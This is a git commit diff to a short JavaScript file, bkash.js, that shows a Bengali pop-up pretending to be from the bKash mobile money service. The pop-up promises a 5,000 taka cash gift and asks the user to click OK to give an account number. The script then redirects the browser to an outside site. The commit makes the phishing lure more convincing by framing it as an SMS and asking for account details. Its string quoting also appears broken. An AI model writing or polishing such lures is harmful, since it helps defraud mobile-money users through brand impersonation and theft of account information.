3083ce99ffa9143c66badcf15316414b5818ddef
usorondo98 <abode_moped_9a@icloud.com>
2026-07-27 10:52:31 -0700

    Update bkash.js

--- bkash.js
+++ bkash.js
@@ -1,5 +1,5 @@
-var password = 'tk5,০০০'
-password=prompt('অভিনন্দন: আপনি বিকাশ থেকে tk5,০০০ টাকার বার্ষিকী ক্যাশ গিফট পাওয়ার যোগ্য; এটি এখনই পেতে 'OK'-তে ক্লিক করুন।');
-if (password != 'tk5,০০০') {
+var password = 'tk5,000'
+password=prompt('SMS: অভিনন্দন, আপনি বিকাশ থেকে ৫,০০০ টাকা পাওয়ার যোগ্য। আপনার অ্যাকাউন্টের নম্বর দিতে 'OK'-তে ক্লিক করুন।','tk5,000');
+if (password != 'tk5,000') {
 location.href='https://www.mechaniitid.site/bkash-tk5000';
 }
